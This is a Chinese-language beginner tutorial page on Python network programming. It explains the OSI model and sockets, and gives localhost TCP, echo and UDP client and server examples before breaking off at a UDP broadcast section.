<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>网络编程补充 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">网络编程补充</h1>
			
		</header>
		<div class="content post__content clearfix">
			


                <div id="content_views" class="markdown_views prism-tomorrow-night-eighties">
                    
                        
                    
                    <p></p>
<div class="toc">
 <h3>网络编程补充</h3>
 <ul>
<li><a href="#1_1">1.认识</a></li>
<li><a href="#2Socket_30">2.Socket网络编程</a></li>
<li><a href="#3TCP_40">3.TCP通讯</a></li>
<li><a href="#4echo_104">4.echo模型</a></li>
<li><a href="#5UDP_191">5.UDP</a></li>
<li><a href="#6UDP_240">6.UDP广播</a></li>
<li><a href="#7HTTP_290">7.HTTP</a></li>
<li><a href="#8HTTP_347">8.HTTP响应</a></li>
<li><a href="#9_397">9.建立响应目录</a></li>
<li><a href="#10_459">10.动态请求处理</a></li>
<li><a href="#11urllib3_531">11.urllib3</a></li>
<li><a href="#12twisted_550">12.twisted模块认识</a></li>
<li><a href="#13twistedTCP_576">13.twisted开发TCP程序</a></li>
<li><a href="#14twistedUDP_635">14.使用twisted开发UDP程序</a></li>
<li><a href="#15Deferred_689">15.Deferred</a></li>
</ul>
</div>
<p></p> 
<h1>
<a id="1_1"></a>1.认识</h1> 
<ol>
<li>网络编程的核心功能就是 <strong>IO</strong> 操作</li>
<li>两台主机的通信要保证两点： 
  <ol>
<li>线路畅通</li>
<li>双方遵守协议</li>
</ol> </li>
<li>在进行网络程序开发的过程中一般都会考虑两种不同的开发模式: 
  <ol>
<li>C/S模式(<strong>Client/Server—客户端/服务端架构</strong>) 
    <ol>
<li>需要编写两套不同的程序(客户端与服务端)</li>
<li>项目维护需要进行两套项目的维护，维护成本比较高</li>
<li>但是这种程序一般使用特定的协议(TCP)，特定的数据结构，隐藏的端口等，安全性比较高</li>
</ol> </li>
<li>B/S模式(<strong>Browser/Server–浏览器与服务端架构</strong>) 
    <ol>
<li>基于WEB设计的一种架构，基于浏览器的形式作为客户端进行访问，</li>
<li>在程序开发时，成本较低，用户使用门槛较低</li>
<li>但这种开发一般基于HTTP协议完成处理，安全性不高，使用的是80端口，极易遭到攻击</li>
</ol> </li>
</ol> </li>
<li>OSI 7层模型 (开放式系统互联) 
  <ol>
<li>网络程序开发不仅仅是一个简单的数据交互过程，还包含一些数据的处理逻辑，而所有的网络设备一定会由不同的硬件厂商生产，所以为了保证数据传输的可靠性以及标准性，就定义了 OSI 7层模型</li>
<li>
</li>
</ol> </li>
</ol> 
<table>
<thead><tr>
<th>No</th>
<th>议成名称</th>
<th>描述</th>
</tr></thead>
<tbody>
<tr>
<td>1</td>
<td>应用层</td>
<td>提供网络服务操作接口</td>
</tr>
<tr>
<td>2</td>
<td>表示层</td>
<td>对要传输的数据进行处理，例如：数据编码</td>
</tr>
<tr>
<td>3</td>
<td>会话层</td>
<td>管理不同的通讯节点之间的连接信息</td>
</tr>
<tr>
<td>4</td>
<td>传输层</td>
<td>建立不同节点之间的网络连接，为数据追加<em>段信息</em>
</td>
</tr>
<tr>
<td>5</td>
<td>网络层</td>
<td>将网络地址映射为mac地址实现数据包转发，为数据追加<em>包信息</em>
</td>
</tr>
<tr>
<td>6</td>
<td>数据链路层</td>
<td>将要发送的数据包转换为数据帧，是其在不可靠的物理链路上进行可靠的数据传输，为数据追加<em>帧信息</em>
</td>
</tr>
<tr>
<td>7</td>
<td>物理层</td>
<td>利用物理设备实现数据的传输(二进制数据传输)</td>
</tr>
</tbody>
</table>
<ol start="5">
<li>有了这7层不同的网络数据的处理分类，所以任何的硬件厂商生产的设备（不管加入多少辅助技术）,其核心是不变的</li>
<li>Python属于高级语言，所以对于所有的网络程序开发不可能让开发者自行处理具体的OSI模型，应该采用统一的模式进行定义，这才有了Socket编程</li>
</ol> 
<h1>
<a id="2Socket_30"></a>2.Socket网络编程</h1> 
<p>Socket(<strong>套接字</strong>)，是一种对TCP/UDP 网络协议进行的一种包装(或者称为协议的一种抽象应用)，本身的特点提供了不同进程之间的数据通讯操作</p> 
<ul>
<li>TCP(传输控制协议) 
  <ul><li>采用有状态的通讯机制进行传输，在通讯时会通过三次握手机制保证与一个指定节点的数据传输的可靠性，在通讯完毕会通过四次挥手的机制关闭连接，由于每次数据的通讯前都需要消耗大量的时间进行连接控制，所以执行性能低，且资源占用较大</li></ul> </li>
<li>UDP(数据报协议 /用户数据报协议) 
  <ul>
<li>采用无状态的通讯机制进行传输。没有了TCP中复杂的握手与挥手处理机制，这样就节约了大量的系统资源，同时数据传输性能较高，但由于不保存单个节点的连接状态，所以发送的数据不一定可以被全部接受。</li>
<li>UDP不需要链接就可以直接发送数据，并且多个接受端都可以同时接受同样的信息，所以UDP适合于广播操作</li>
</ul> </li>
</ul> 
<p>不论是TCP还是UDP协议，都是对传输层操作的保证，数据按照OSI 七层模型来说 一定要通过网络层进行路由的配置，同时利用数据链路层添加数据帧，最终利用物理层发出，但是由于Socket机制的存在，所以开发者只需要编写处理的核心代码，而具体的传输，协议操作就完全被包装了</p> 
<h1>
<a id="3TCP_40"></a>3.TCP通讯</h1> 
<p>TCP是面向连接的网络传输协议，在进行TCP通讯的过程中其安全性以及稳定性都是最高的，虽然性能会差些，但是对于当前网络环境来讲主要还是使用TCP协议的居多<br> python中使用socket.socket类即可实现TCP程序开发：</p> 
<table>
<thead><tr>
<th>No</th>
<th>函数</th>
<th>类型</th>
<th>描述</th>
</tr></thead>
<tbody>
<tr>
<td>1</td>
<td>socket()</td>
<td>构造</td>
<td>获取socket类对象</td>
</tr>
<tr>
<td>2</td>
<td>bind(hostname,port)</td>
<td>方法</td>
<td>在指定主机的端口绑定监听</td>
</tr>
<tr>
<td>3</td>
<td>listen()</td>
<td>方法</td>
<td>在绑定的端口上开启监听</td>
</tr>
<tr>
<td>4</td>
<td>accept()</td>
<td>方法</td>
<td>等待客户端连接，连接后返回客户端地址</td>
</tr>
<tr>
<td>5</td>
<td>send(data)</td>
<td>方法</td>
<td>发送数据</td>
</tr>
<tr>
<td>6</td>
<td>recv(buffer)</td>
<td>方法</td>
<td>接收数据</td>
</tr>
<tr>
<td>7</td>
<td>close()</td>
<td>方法</td>
<td>关闭套接字连接</td>
</tr>
<tr>
<td>8</td>
<td>connect(hostname,port)</td>
<td>方法</td>
<td>设置连接的主机名称与端口号</td>
</tr>
</tbody>
</table>
<ol>
<li>客户端开发过程： 
  <ol>
<li>创建TCP客户端套接字</li>
<li>和服务端套接字建立连接</li>
<li>发送数据给服务端</li>
<li>接收服务端数据</li>
<li>关闭套接字</li>
</ol> </li>
<li>服务端开发过程 
  <ol>
<li>创建服务端套接字对象</li>
<li>设置端口端口号复用–让服务端关闭后端口号立即释放</li>
<li>绑定端口号</li>
<li>设置监听</li>
<li>等待接受客户端连接(接收客户端的套接字与端口)</li>
<li>接受数据</li>
<li>发送数据</li>
<li>关闭套接字(关闭客户端套接字与服务端套接字)</li>
</ol> </li>
</ol> 
<p>整个Socket网络编程之中基本的核心流程就是服务端开启监听端口，等待客户端连接，而客户端想要访问服务器就必须进行服务器的地址连接，而后进行响应的数据的请求或响应内容的接收</p> 
<pre><code class="prism language-python"><span class="token comment">#-------------这是服务端--------</span>
<span class="token keyword">import</span> socket
<span class="token comment">#服务端的地址端口</span>
SERVER_HOST<span class="token operator">=</span><span class="token string">'localhost'</span>
SERVER_PORT<span class="token operator">=</span><span class="token number">8080</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#socket网络服务每一次处理完成之后一定要使用close()关闭，所以使用with结构定义</span>
    <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> server_socket<span class="token punctuation">:</span><span class="token comment">#创建服务端Socket</span>
        server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>SERVER_HOST<span class="token punctuation">,</span>SERVER_PORT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#绑定服务端主机与端口</span>
        server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#开启监听</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[服务端]服务端启动完成，在%s端口上监听等待客户端连接。。。'</span><span class="token operator">%</span>SERVER_PORT<span class="token punctuation">)</span>
        new_socket<span class="token punctuation">,</span>iport<span class="token operator">=</span>server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#等待客户端连接，处于阻塞状态</span>
        new_socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'你好，这里是服务端！'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>iport<span class="token punctuation">,</span><span class="token string">'连接成功! 响应:'</span><span class="token punctuation">,</span>new_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<pre><code class="prism language-python"><span class="token comment">#------------这是客户端----------</span>
<span class="token keyword">import</span> socket
SERVER_HOST<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token comment">#要连接的服务端的主机名称或ip地址</span>
SERVER_PORT<span class="token operator">=</span><span class="token number">8080</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> client_socket<span class="token punctuation">:</span><span class="token comment">#建立客户端socket</span>
        client_socket<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>SERVER_HOST<span class="token punctuation">,</span>SERVER_PORT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#连接服务器</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'服务端响应数据：%s'</span><span class="token operator">%</span>client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#接收数据长度为128字</span>
        client_socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'你好，这里是客户端！'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#发送消息</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<h1>
<a id="4echo_104"></a>4.echo模型</h1> 
<p>echo程序模型来源于echo命令，在操作系统内部提供一个echo命令进行内容的回显<br> echo指令 输入什么–返回什么</p> 
<p>将echo的概念扩大到网络环境中，就可以理解为客户端输入一组数据发送到服务端，那么服务端接受之后对该数据进行响应，这种模型就是网络编程echo模型</p> 
<p>在整个网络编程中，由于所有网络程序一定要有一个绑定的端口号存在，所以一个端口只允许绑定一个服务，如果出现端口被占用的情况，那么程序将无法正常启动</p> 
<p>对于当前服务端程序如果想要测试，简单可以直接通过<strong>telnet</strong>命令来完成，每当用户输入一个内容之后就会立即将此内容发送到服务端，但window命令行采用的GBK编码，会造成乱码，但是可以测试服务端是正确的</p> 
<pre><code class="prism language-python"><span class="token comment">#-------------这是服务端--------</span>
<span class="token keyword">import</span> socket
<span class="token comment">#服务端的地址端口</span>
SERVER_HOST<span class="token operator">=</span><span class="token string">'localhost'</span>
SERVER_PORT<span class="token operator">=</span><span class="token number">8080</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#socket网络服务每一次处理完成之后一定要使用close()关闭，所以使用with结构定义</span>
    <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> server_socket<span class="token punctuation">:</span><span class="token comment">#创建服务端Socket</span>
        server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>SERVER_HOST<span class="token punctuation">,</span>SERVER_PORT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#绑定服务端主机与端口</span>
        server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#开启监听</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[服务端]服务端启动完成，在%s端口上监听等待客户端连接。。。'</span><span class="token operator">%</span>SERVER_PORT<span class="token punctuation">)</span>
        cli_socket<span class="token punctuation">,</span>iport<span class="token operator">=</span>server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#等待客户端连接，处于阻塞状态</span>

        <span class="token keyword">with</span> cli_socket<span class="token punctuation">:</span><span class="token comment">#进行客户端的处理</span>
            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><span class="token comment">#不断进行信息的接收与响应</span>
                data <span class="token operator">=</span> cli_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收客户端传过来的数据</span>
                <span class="token keyword">if</span> data<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'BYEBYE'</span><span class="token punctuation">:</span><span class="token comment">#客户端输入此指令</span>
                    cli_socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'exit'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    <span class="token keyword">break</span><span class="token comment">#结束循环</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment">#进行正常的响应</span>
                    cli_socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'echo %s'</span><span class="token operator">%</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#向客户端进行去请求响应</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<pre><code class="prism language-python"><span class="token comment">#------------这是客户端----------</span>
<span class="token keyword">import</span> socket
SERVER_HOST<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token comment">#要连接的服务端的主机名称或ip地址</span>
SERVER_PORT<span class="token operator">=</span><span class="token number">8080</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> client_socket<span class="token punctuation">:</span><span class="token comment">#建立客户端socket</span>
        client_socket<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>SERVER_HOST<span class="token punctuation">,</span>SERVER_PORT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#连接服务器</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><span class="token comment">#客户端要不断与服务端交互</span>
            input_data<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入要发送的数据(输入byebye结束):'</span><span class="token punctuation">)</span>
            client_socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span>input_data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#数据发送</span>
            echo_data<span class="token operator">=</span>client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> echo_data<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'EXIT'</span><span class="token punctuation">:</span><span class="token comment">#结束</span>
                <span class="token keyword">break</span><span class="token comment">#断开连接</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>echo_data<span class="token punctuation">)</span><span class="token comment">#输出服务端响应内容</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p>当服务器端引入并发编程的概念之后，那么就可以同时进行多个客户端的请求处理，在开发行业内有一个“高并发”指的就是连接客户端比较多，所以这个时候如何处理好服务端处理性能就成为项目设计的关键</p> 
<pre><code class="prism language-python"><span class="token comment">#-------------这是服务端--------</span>
<span class="token keyword">import</span> multiprocessing
<span class="token keyword">import</span> socket
<span class="token comment">#服务端的地址端口</span>
SERVER_HOST<span class="token operator">=</span><span class="token string">'localhost'</span>
SERVER_PORT<span class="token operator">=</span><span class="token number">8080</span>
<span class="token keyword">def</span> <span class="token function">echo_handle</span><span class="token punctuation">(</span>cli_socket<span class="token punctuation">,</span>iport<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#进程处理函数</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[服务端]，在%s端口上监听客户端。。。'</span> <span class="token operator">%</span> iport<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> cli_socket<span class="token punctuation">:</span>  <span class="token comment"># 进行客户端的处理</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>  <span class="token comment"># 不断进行信息的接收与响应</span>
            data <span class="token operator">=</span> cli_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 接收客户端传过来的数据</span>
            <span class="token keyword">if</span> data<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'BYEBYE'</span><span class="token punctuation">:</span>  <span class="token comment"># 客户端输入此指令</span>
                cli_socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'exit'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>  <span class="token comment"># 结束循环</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>  <span class="token comment"># 进行正常的响应</span>
                cli_socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'echo %s'</span> <span class="token operator">%</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 向客户端进行去请求响应</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#socket网络服务每一次处理完成之后一定要使用close()关闭，所以使用with结构定义</span>
    <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> server_socket<span class="token punctuation">:</span><span class="token comment">#创建服务端Socket</span>
        server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>SERVER_HOST<span class="token punctuation">,</span>SERVER_PORT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#绑定服务端主机与端口</span>
        server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#开启监听</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><span class="token comment">#不断接受请求</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[服务端]服务端启动完成，在%s端口上监听等待客户端连接。。。'</span> <span class="token operator">%</span> SERVER_PORT<span class="token punctuation">)</span>
            cli_socket<span class="token punctuation">,</span> iport <span class="token operator">=</span> server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 等待客户端连接，处于阻塞状态</span>
            process<span class="token operator">=</span>multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>echo_handle<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>cli_socket<span class="token punctuation">,</span>iport<span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'客户端进程-%s'</span><span class="token operator">%</span>iport<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#定义进程</span>
            process<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#启动进程</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<h1>
<a id="5UDP_191"></a>5.UDP</h1> 
<p>UDP也是网络传输层上的一种协议，但与TCP相比，UDP本身采用的是不安全的连接，所以来讲每一次通过UDP发送对1数据不一定可以接收到，但是由于其性能比较好，所以未来会有广阔的发展前景</p> 
<p>在Python中对于TCP/UDP本身的实现结构差别不大，都是通过socket.socket类完成的，只需要设置一些参数即可将其设为UDP(数据报协议)</p> 
<p>UDP与TCP服务端最大的区别是不再需要过多的考虑到数据稳定性的连接问题了，所以也不再设置有具体的监听操作，在每次接收到请求之后只需要获取客户端的原始地址，直接根据原路返回即可</p> 
<pre><code class="prism language-python"><span class="token comment">#-------------这是服务端--------</span>
<span class="token keyword">import</span> socket
<span class="token comment">#服务端的地址端口</span>
SERVER_HOST<span class="token operator">=</span><span class="token string">'localhost'</span>
SERVER_PORT<span class="token operator">=</span><span class="token number">8080</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#socket网络服务每一次处理完成之后一定要使用close()关闭，所以使用with结构定义</span>
    <span class="token comment">#socket.AF_INET ip4网络协议进行服务端创建</span>
    <span class="token comment">#socket.SOCK_DGRAM创建一个数据报协议的服务端(UDP)</span>
    <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span> <span class="token keyword">as</span> server_socket<span class="token punctuation">:</span><span class="token comment">#创建服务端Socket</span>
        server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>SERVER_HOST<span class="token punctuation">,</span>SERVER_PORT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#绑定服务端主机与端口</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[服务端]服务端启动完成，在%s端口上监听等待客户端连接。。。'</span><span class="token operator">%</span>SERVER_PORT<span class="token punctuation">)</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><span class="token comment">#不断进行接收</span>
            data<span class="token punctuation">,</span>iport<span class="token operator">=</span>server_socket<span class="token punctuation">.</span>recvfrom<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token comment">#接收客户端发送的数据</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>iport<span class="token punctuation">,</span> <span class="token string">'连接成功! 响应:'</span><span class="token punctuation">)</span>
            echo_data<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'echo %s'</span><span class="token operator">%</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#响应数据 从哪来会那去</span>
            server_socket<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span>echo_data<span class="token punctuation">,</span>iport<span class="token punctuation">)</span><span class="token comment">#将内容响应到发送端上</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<pre><code class="prism language-python"><span class="token comment">#------------这是客户端----------</span>
<span class="token keyword">import</span> socket
SERVER_HOST<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token comment">#要连接的服务端的主机名称或ip地址</span>
SERVER_PORT<span class="token operator">=</span><span class="token number">8080</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span> <span class="token keyword">as</span> client_socket<span class="token punctuation">:</span><span class="token comment">#建立客户端socket</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><span class="token comment">#客户端要不断与服务端交互</span>
            input_data<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入要发送的数据(输入byebye结束):'</span><span class="token punctuation">)</span>
            client_socket<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span>input_data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>SERVER_HOST<span class="token punctuation">,</span>SERVER_PORT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#数据发送</span>
            <span class="token keyword">if</span> input_data<span class="token punctuation">:</span><span class="token comment">#如果有数据</span>
                echo_data<span class="token operator">=</span>client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#响应数据</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'服务端响应数据: %s'</span><span class="token operator">%</span>echo_data<span class="token punctuation">)</span><span class="token comment">#输出内容</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment">#没有数据 (直接回车表示程序结束)</span>
                <span class="token keyword">break</span> <span class="token comment">#退出交互</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<h1>
<a id="6UDP_240"></a>6.UDP广播</h1> 
<p>使用UDP除了可以建立快速的网络通讯之外，实际还有一个主要的功能就是实现数据广播的操作，它可以实现一个局域网内的所有主机信息的广播处理，要实现UDP广播操作，则一定要在程序之中使用如下的方法进行定义：</p> 
<pre><code class="prism language-python">setsockopt<span class="token punctuation">(</span>self<span class="token punctuation">,</span>level<span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">,</span>optname<span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">,</span>value<span class="token punctuation">:</span>Union<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">,</span><span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">#level:设置选项所在的协议层编号，有如下四个可用的配置项</span>
<span class="token comment">#socket.SOL_SOCKET:基本套接字接口</span>
<span class="token comment">#socket.IPPROTO_IP:IP4套接字接口</span>
<span class="token comment">#socket.IPPROTO_IPV6:IPv6套接字接口</span>
<span class="token comment">#socket.IPPROTO_TCP:TCP套接字接口</span>
<span class="token comment">#optname:设置选项名称，例如，如果要进行广播则可以使用 socket.BROADCAST</span>
